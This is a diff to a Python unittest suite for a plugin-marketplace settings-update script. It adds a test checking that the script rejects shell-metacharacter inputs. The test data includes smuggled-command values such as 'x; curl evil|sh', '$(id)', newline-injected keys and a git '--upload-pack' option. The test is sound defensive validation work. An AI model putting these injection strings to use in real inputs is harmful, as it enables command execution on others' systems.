@@ -120,6 +120,30 @@ class UpdateSettingsTest(unittest.TestCase):
         self.assertEqual(commands[0], "other.sh")
         self.assertEqual(len(commands), 2)
 
+    def run_raw(self, **overrides):
+        args = {"marketplace": "cedricziel", "repo": "cedricziel/claude-plugins",
+                "plugins": "oss", "ref": "main", "sha": SHA_A, **overrides}
+        cmd = ["python3", str(SCRIPT), "--settings", str(self.settings), "--session-hook"]
+        for key, value in args.items():
+            cmd += [f"--{key}={value}"]
+        return subprocess.run(cmd, capture_output=True, text=True)
+
+    def test_rejects_shell_metacharacters_in_inputs(self):
+        for field, value in [
+            ("marketplace", "x; curl evil|sh"),
+            ("repo", "owner/repo\nhook=evil"),
+            ("repo", "no-slash"),
+            ("plugins", "oss,$(id)"),
+            ("ref", "--upload-pack=evil"),
+            ("ref", "main\nsha=evil"),
+            ("sha", "not-a-sha"),
+        ]:
+            with self.subTest(field=field, value=value):
+                out = self.run_raw(**{field: value})
+                self.assertNotEqual(out.returncode, 0)
+                self.assertEqual(out.stdout, "")
+                self.assertFalse(self.settings.exists())
+
 
 if __name__ == "__main__":
     unittest.main()
